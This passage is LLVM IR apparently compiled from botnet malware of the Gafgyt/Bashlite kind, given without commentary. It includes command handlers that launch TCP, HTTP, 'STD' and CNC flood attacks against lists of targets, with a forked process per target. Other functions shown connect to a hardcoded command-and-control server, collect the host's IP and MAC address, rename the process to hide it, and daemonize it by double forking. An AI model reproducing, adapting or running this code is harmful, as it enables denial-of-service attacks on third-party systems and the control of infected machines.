  %344 = call i8* @strstr(i8* %343, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #11
  %345 = icmp ne i8* %344, null
  br i1 %345, label %346, label %366

346:                                              ; preds = %341
  %347 = load i8*, i8** %15, align 8
  %348 = call i8* @strtok(i8* %347, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #12
  store i8* %348, i8** %22, align 8
  br label %349

349:                                              ; preds = %363, %346
  %350 = load i8*, i8** %22, align 8
  %351 = icmp ne i8* %350, null
  br i1 %351, label %352, label %365

352:                                              ; preds = %349
  %353 = call i32 @listFork()
  %354 = icmp ne i32 %353, 0
  br i1 %354, label %363, label %355

355:                                              ; preds = %352
  %356 = load i8*, i8** %22, align 8
  %357 = load i32, i32* %16, align 4
  %358 = load i32, i32* %17, align 4
  %359 = load i32, i32* %18, align 4
  %360 = load i8*, i8** %19, align 8
  %361 = load i32, i32* %21, align 4
  %362 = load i32, i32* %20, align 4
  call void @sendTCP(i8* %356, i32 %357, i32 %358, i32 %359, i8* %360, i32 %361, i32 %362)
  call void @_exit(i32 0) #14
  unreachable

363:                                              ; preds = %352
  %364 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #12
  store i8* %364, i8** %22, align 8
  br label %349, !llvm.loop !48

365:                                              ; preds = %349
  br label %378

366:                                              ; preds = %341
  %367 = call i32 @listFork()
  %368 = icmp ne i32 %367, 0
  br i1 %368, label %369, label %370

369:                                              ; preds = %366
  br label %622

370:                                              ; preds = %366
  %371 = load i8*, i8** %15, align 8
  %372 = load i32, i32* %16, align 4
  %373 = load i32, i32* %17, align 4
  %374 = load i32, i32* %18, align 4
  %375 = load i8*, i8** %19, align 8
  %376 = load i32, i32* %21, align 4
  %377 = load i32, i32* %20, align 4
  call void @sendTCP(i8* %371, i32 %372, i32 %373, i32 %374, i8* %375, i32 %376, i32 %377)
  call void @_exit(i32 0) #14
  unreachable

378:                                              ; preds = %365
  br label %379

379:                                              ; preds = %378, %252
  %380 = load i8**, i8*** %4, align 8
  %381 = getelementptr inbounds i8*, i8** %380, i64 0
  %382 = load i8*, i8** %381, align 8
  %383 = call i32 @strcmp(i8* %382, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i64 0, i64 0)) #11
  %384 = icmp ne i32 %383, 0
  br i1 %384, label %447, label %385

385:                                              ; preds = %379
  %386 = load i32, i32* %3, align 4
  %387 = icmp slt i32 %386, 3
  br i1 %387, label %394, label %388

388:                                              ; preds = %385
  %389 = load i8**, i8*** %4, align 8
  %390 = getelementptr inbounds i8*, i8** %389, i64 2
  %391 = load i8*, i8** %390, align 8
  %392 = call i32 @atoi(i8* %391) #11
  %393 = icmp slt i32 %392, 1
  br i1 %393, label %394, label %395

394:                                              ; preds = %388, %385
  br label %622

395:                                              ; preds = %388
  %396 = load i8**, i8*** %4, align 8
  %397 = getelementptr inbounds i8*, i8** %396, i64 1
  %398 = load i8*, i8** %397, align 8
  store i8* %398, i8** %23, align 8
  %399 = load i8**, i8*** %4, align 8
  %400 = getelementptr inbounds i8*, i8** %399, i64 2
  %401 = load i8*, i8** %400, align 8
  %402 = call i32 @atoi(i8* %401) #11
  store i32 %402, i32* %24, align 4
  %403 = load i8*, i8** %23, align 8
  %404 = call i8* @strstr(i8* %403, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #11
  %405 = icmp ne i8* %404, null
  br i1 %405, label %406, label %430

406:                                              ; preds = %395
  %407 = load i8*, i8** %23, align 8
  %408 = call i8* @strtok(i8* %407, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #12
  store i8* %408, i8** %25, align 8
  br label %409

409:                                              ; preds = %427, %406
  %410 = load i8*, i8** %25, align 8
  %411 = icmp ne i8* %410, null
  br i1 %411, label %412, label %429

412:                                              ; preds = %409
  %413 = call i32 @listFork()
  %414 = icmp ne i32 %413, 0
  br i1 %414, label %427, label %415

415:                                              ; preds = %412
  store i32 0, i32* %26, align 4
  br label %416

416:                                              ; preds = %419, %415
  %417 = load i32, i32* %26, align 4
  %418 = icmp slt i32 %417, 10
  br i1 %418, label %419, label %424

419:                                              ; preds = %416
  %420 = load i8*, i8** %23, align 8
  %421 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %420, i32 %421)
  %422 = load i32, i32* %26, align 4
  %423 = add nsw i32 %422, 1
  store i32 %423, i32* %26, align 4
  br label %416, !llvm.loop !49

424:                                              ; preds = %416
  %425 = load i32, i32* @mainCommSock, align 4
  %426 = call i32 @close(i32 %425)
  call void @_exit(i32 0) #14
  unreachable

427:                                              ; preds = %412
  %428 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #12
  store i8* %428, i8** %25, align 8
  br label %409, !llvm.loop !50

429:                                              ; preds = %409
  br label %446

430:                                              ; preds = %395
  %431 = call i32 @listFork()
  %432 = icmp ne i32 %431, 0
  br i1 %432, label %433, label %434

433:                                              ; preds = %430
  br label %622

434:                                              ; preds = %430
  store i32 0, i32* %27, align 4
  br label %435

435:                                              ; preds = %438, %434
  %436 = load i32, i32* %27, align 4
  %437 = icmp slt i32 %436, 10
  br i1 %437, label %438, label %443

438:                                              ; preds = %435
  %439 = load i8*, i8** %23, align 8
  %440 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %439, i32 %440)
  %441 = load i32, i32* %27, align 4
  %442 = add nsw i32 %441, 1
  store i32 %442, i32* %27, align 4
  br label %435, !llvm.loop !51

443:                                              ; preds = %435
  %444 = load i32, i32* @mainCommSock, align 4
  %445 = call i32 @close(i32 %444)
  call void @_exit(i32 0) #14
  unreachable

446:                                              ; preds = %429
  br label %447

447:                                              ; preds = %446, %379
  %448 = load i8**, i8*** %4, align 8
  %449 = getelementptr inbounds i8*, i8** %448, i64 0
  %450 = load i8*, i8** %449, align 8
  %451 = call i32 @strcmp(i8* %450, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i64 0, i64 0)) #11
  %452 = icmp ne i32 %451, 0
  br i1 %452, label %511, label %453

453:                                              ; preds = %447
  %454 = load i32, i32* %3, align 4
  %455 = icmp slt i32 %454, 4
  br i1 %455, label %468, label %456

456:                                              ; preds = %453
  %457 = load i8**, i8*** %4, align 8
  %458 = getelementptr inbounds i8*, i8** %457, i64 2
  %459 = load i8*, i8** %458, align 8
  %460 = call i32 @atoi(i8* %459) #11
  %461 = icmp slt i32 %460, 1
  br i1 %461, label %468, label %462

462:                                              ; preds = %456
  %463 = load i8**, i8*** %4, align 8
  %464 = getelementptr inbounds i8*, i8** %463, i64 3
  %465 = load i8*, i8** %464, align 8
  %466 = call i32 @atoi(i8* %465) #11
  %467 = icmp slt i32 %466, 1
  br i1 %467, label %468, label %469

468:                                              ; preds = %462, %456, %453
  br label %622

469:                                              ; preds = %462
  %470 = load i8**, i8*** %4, align 8
  %471 = getelementptr inbounds i8*, i8** %470, i64 1
  %472 = load i8*, i8** %471, align 8
  store i8* %472, i8** %28, align 8
  %473 = load i8**, i8*** %4, align 8
  %474 = getelementptr inbounds i8*, i8** %473, i64 2
  %475 = load i8*, i8** %474, align 8
  %476 = call i32 @atoi(i8* %475) #11
  store i32 %476, i32* %29, align 4
  %477 = load i8**, i8*** %4, align 8
  %478 = getelementptr inbounds i8*, i8** %477, i64 3
  %479 = load i8*, i8** %478, align 8
  %480 = call i32 @atoi(i8* %479) #11
  store i32 %480, i32* %30, align 4
  %481 = load i8*, i8** %28, align 8
  %482 = call i8* @strstr(i8* %481, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #11
  %483 = icmp ne i8* %482, null
  br i1 %483, label %484, label %502

484:                                              ; preds = %469
  %485 = load i8*, i8** %28, align 8
  %486 = call i8* @strtok(i8* %485, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #12
  store i8* %486, i8** %31, align 8
  br label %487

487:                                              ; preds = %499, %484
  %488 = load i8*, i8** %31, align 8
  %489 = icmp ne i8* %488, null
  br i1 %489, label %490, label %501

490:                                              ; preds = %487
  %491 = call i32 @listFork()
  %492 = icmp ne i32 %491, 0
  br i1 %492, label %499, label %493

493:                                              ; preds = %490
  %494 = load i8*, i8** %31, align 8
  %495 = load i32, i32* %29, align 4
  %496 = load i32, i32* %30, align 4
  call void @sendCNC(i8* %494, i32 %495, i32 %496)
  %497 = load i32, i32* @mainCommSock, align 4
  %498 = call i32 @close(i32 %497)
  call void @_exit(i32 0) #14
  unreachable

499:                                              ; preds = %490
  %500 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #12
  store i8* %500, i8** %31, align 8
  br label %487, !llvm.loop !52

501:                                              ; preds = %487
  br label %510

502:                                              ; preds = %469
  %503 = call i32 @listFork()
  %504 = icmp ne i32 %503, 0
  br i1 %504, label %505, label %506

505:                                              ; preds = %502
  br label %622

506:                                              ; preds = %502
  %507 = load i8*, i8** %28, align 8
  %508 = load i32, i32* %29, align 4
  %509 = load i32, i32* %30, align 4
  call void @sendCNC(i8* %507, i32 %508, i32 %509)
  call void @_exit(i32 0) #14
  unreachable

510:                                              ; preds = %501
  br label %511

511:                                              ; preds = %510, %447
  %512 = load i8**, i8*** %4, align 8
  %513 = getelementptr inbounds i8*, i8** %512, i64 0
  %514 = load i8*, i8** %513, align 8
  %515 = call i32 @strcmp(i8* %514, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.109, i64 0, i64 0)) #11
  %516 = icmp ne i32 %515, 0
  br i1 %516, label %573, label %517

517:                                              ; preds = %511
  %518 = load i32, i32* %3, align 4
  %519 = icmp slt i32 %518, 4
  br i1 %519, label %532, label %520

520:                                              ; preds = %517
  %521 = load i8**, i8*** %4, align 8
  %522 = getelementptr inbounds i8*, i8** %521, i64 2
  %523 = load i8*, i8** %522, align 8
  %524 = call i32 @atoi(i8* %523) #11
  %525 = icmp slt i32 %524, 1
  br i1 %525, label %532, label %526

526:                                              ; preds = %520
  %527 = load i8**, i8*** %4, align 8
  %528 = getelementptr inbounds i8*, i8** %527, i64 3
  %529 = load i8*, i8** %528, align 8
  %530 = call i32 @atoi(i8* %529) #11
  %531 = icmp slt i32 %530, 1
  br i1 %531, label %532, label %533

532:                                              ; preds = %526, %520, %517
  br label %622

533:                                              ; preds = %526
  %534 = load i8**, i8*** %4, align 8
  %535 = getelementptr inbounds i8*, i8** %534, i64 1
  %536 = load i8*, i8** %535, align 8
  store i8* %536, i8** %32, align 8
  %537 = load i8**, i8*** %4, align 8
  %538 = getelementptr inbounds i8*, i8** %537, i64 2
  %539 = load i8*, i8** %538, align 8
  %540 = call i32 @atoi(i8* %539) #11
  store i32 %540, i32* %33, align 4
  %541 = load i8**, i8*** %4, align 8
  %542 = getelementptr inbounds i8*, i8** %541, i64 3
  %543 = load i8*, i8** %542, align 8
  %544 = call i32 @atoi(i8* %543) #11
  store i32 %544, i32* %34, align 4
  %545 = load i8*, i8** %32, align 8
  %546 = call i8* @strstr(i8* %545, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #11
  %547 = icmp ne i8* %546, null
  br i1 %547, label %548, label %564

548:                                              ; preds = %533
  %549 = load i8*, i8** %32, align 8
  %550 = call i8* @strtok(i8* %549, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #12
  store i8* %550, i8** %35, align 8
  br label %551

551:                                              ; preds = %561, %548
  %552 = load i8*, i8** %35, align 8
  %553 = icmp ne i8* %552, null
  br i1 %553, label %554, label %563

554:                                              ; preds = %551
  %555 = call i32 @listFork()
  %556 = icmp ne i32 %555, 0
  br i1 %556, label %561, label %557

557:                                              ; preds = %554
  %558 = load i8*, i8** %35, align 8
  %559 = load i32, i32* %33, align 4
  %560 = load i32, i32* %34, align 4
  call void @sendSTD(i8* %558, i32 %559, i32 %560)
  call void @_exit(i32 0) #14
  unreachable

561:                                              ; preds = %554
  %562 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #12
  store i8* %562, i8** %35, align 8
  br label %551, !llvm.loop !53

563:                                              ; preds = %551
  br label %572

564:                                              ; preds = %533
  %565 = call i32 @listFork()
  %566 = icmp ne i32 %565, 0
  br i1 %566, label %567, label %568

567:                                              ; preds = %564
  br label %622

568:                                              ; preds = %564
  %569 = load i8*, i8** %32, align 8
  %570 = load i32, i32* %33, align 4
  %571 = load i32, i32* %34, align 4
  call void @sendSTD(i8* %569, i32 %570, i32 %571)
  call void @_exit(i32 0) #14
  unreachable

572:                                              ; preds = %563
  br label %573

573:                                              ; preds = %572, %511
  %574 = load i8**, i8*** %4, align 8
  %575 = getelementptr inbounds i8*, i8** %574, i64 0
  %576 = load i8*, i8** %575, align 8
  %577 = call i32 @strcmp(i8* %576, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.110, i64 0, i64 0)) #11
  %578 = icmp ne i32 %577, 0
  br i1 %578, label %615, label %579

579:                                              ; preds = %573
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  br label %580

580:                                              ; preds = %606, %579
  %581 = load i64, i64* %37, align 8
  %582 = load i64, i64* @numpids, align 8
  %583 = icmp ult i64 %581, %582
  br i1 %583, label %584, label %609

584:                                              ; preds = %580
  %585 = load i32*, i32** @pids, align 8
  %586 = load i64, i64* %37, align 8
  %587 = getelementptr inbounds i32, i32* %585, i64 %586
  %588 = load i32, i32* %587, align 4
  %589 = icmp ne i32 %588, 0
  br i1 %589, label %590, label %605

590:                                              ; preds = %584
  %591 = load i32*, i32** @pids, align 8
  %592 = load i64, i64* %37, align 8
  %593 = getelementptr inbounds i32, i32* %591, i64 %592
  %594 = load i32, i32* %593, align 4
  %595 = call i32 @getpid() #12
  %596 = icmp ne i32 %594, %595
  br i1 %596, label %597, label %605

597:                                              ; preds = %590
  %598 = load i32*, i32** @pids, align 8
  %599 = load i64, i64* %37, align 8
  %600 = getelementptr inbounds i32, i32* %598, i64 %599
  %601 = load i32, i32* %600, align 4
  %602 = call i32 @kill(i32 %601, i32 9) #12
  %603 = load i32, i32* %36, align 4
  %604 = add nsw i32 %603, 1
  store i32 %604, i32* %36, align 4
  br label %605

605:                                              ; preds = %597, %590, %584
  br label %606

606:                                              ; preds = %605
  %607 = load i64, i64* %37, align 8
  %608 = add i64 %607, 1
  store i64 %608, i64* %37, align 8
  br label %580, !llvm.loop !54

609:                                              ; preds = %580
  %610 = load i32, i32* %36, align 4
  %611 = icmp sgt i32 %610, 0
  br i1 %611, label %612, label %613

612:                                              ; preds = %609
  br label %614

613:                                              ; preds = %609
  br label %614

614:                                              ; preds = %613, %612
  br label %615

615:                                              ; preds = %614, %573
  %616 = load i8**, i8*** %4, align 8
  %617 = getelementptr inbounds i8*, i8** %616, i64 0
  %618 = load i8*, i8** %617, align 8
  %619 = call i32 @strcmp(i8* %618, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.111, i64 0, i64 0)) #11
  %620 = icmp ne i32 %619, 0
  br i1 %620, label %622, label %621

621:                                              ; preds = %615
  call void @exit(i32 0) #16
  unreachable

622:                                              ; preds = %43, %52, %66, %78, %92, %99, %104, %116, %123, %128, %187, %243, %303, %369, %394, %433, %468, %505, %532, %567, %615
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %4, i8 0, i64 4096, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

7:                                                ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

10:                                               ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

15:                                               ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

16:                                               ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

19:                                               ; preds = %16, %15
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #12
  store i32 443, i32* %3, align 4
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %27 = call i8* @strchr(i8* %26, i32 58) #11
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

29:                                               ; preds = %19
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %31 = call i8* @strchr(i8* %30, i32 58) #11
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #11
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %35 = call i8* @strchr(i8* %34, i32 58) #11
  store i8 0, i8* %35, align 1
  br label %36

36:                                               ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #12
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

43:                                               ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

44:                                               ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

45:                                               ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #12
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

16:                                               ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %17, i8 0, i64 16, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i64 0, i64 0)) #12
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #15
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

29:                                               ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

30:                                               ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #12
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

37:                                               ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.113, i64 0, i64 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

42:                                               ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

47:                                               ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i64 0, i64 0)) #11
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

51:                                               ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %52, i8** %9, align 8
  br label %53

53:                                               ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

58:                                               ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53, !llvm.loop !55

61:                                               ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

63:                                               ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %64, i8 0, i64 4096, i1 false)
  br label %42, !llvm.loop !56

65:                                               ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

71:                                               ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.5* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i64 0, i64 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #12
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #12
  store i32 0, i32* %10, align 4
  br label %79

79:                                               ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

82:                                               ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.6* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i64 0, i64 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

94:                                               ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79, !llvm.loop !57

97:                                               ; preds = %79
  br label %98

98:                                               ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

101:                                              ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i64 0, i64 0)
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i64 0, i64 0), i8** %6, align 8
  %25 = call i8* @getBuild()
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.117, i64 0, i64 0), i8* %25)
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @strlen(i8* %32) #11
  %34 = call i8* @strncpy(i8* %29, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i64 0, i64 0), i64 %33) #12
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i64 0, i64 0), i8** %36, align 8
  %37 = load i8*, i8** %6, align 8
  %38 = ptrtoint i8* %37 to i64
  %39 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %38, i32 0, i32 0, i32 0)
  %40 = call i64 @time(i64* null) #12
  %41 = call i32 @getpid() #12
  %42 = sext i32 %41 to i64
  %43 = xor i64 %40, %42
  %44 = trunc i64 %43 to i32
  call void @srand(i32 %44) #12
  %45 = call i64 @time(i64* null) #12
  %46 = call i32 @getpid() #12
  %47 = sext i32 %46 to i64
  %48 = xor i64 %45, %47
  %49 = trunc i64 %48 to i32
  call void @init_rand(i32 %49)
  %50 = call i32 @getOurIP()
  %51 = call i32 @fork() #12
  store i32 %51, i32* %7, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %56

53:                                               ; preds = %2
  %54 = load i32, i32* %7, align 4
  %55 = call i32 @waitpid(i32 %54, i32* %9, i32 0)
  call void @exit(i32 0) #16
  unreachable

56:                                               ; preds = %2
  %57 = load i32, i32* %7, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %71, label %59

59:                                               ; preds = %56
  %60 = call i32 @fork() #12
  store i32 %60, i32* %8, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %63

62:                                               ; preds = %59
  call void @exit(i32 0) #16
  unreachable

63:                                               ; preds = %59
  %64 = load i32, i32* %8, align 4
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %67, label %66

66:                                               ; preds = %63
  br label %69

67:                                               ; preds = %63
  %68 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.118, i64 0, i64 0))
  br label %69

69:                                               ; preds = %67, %66
  br label %70

70:                                               ; preds = %69
  br label %73

71:                                               ; preds = %56
  %72 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.118, i64 0, i64 0))
  br label %73

73:                                               ; preds = %71, %70
  br label %74

74:                                               ; preds = %73
  %75 = call i32 @setsid() #12
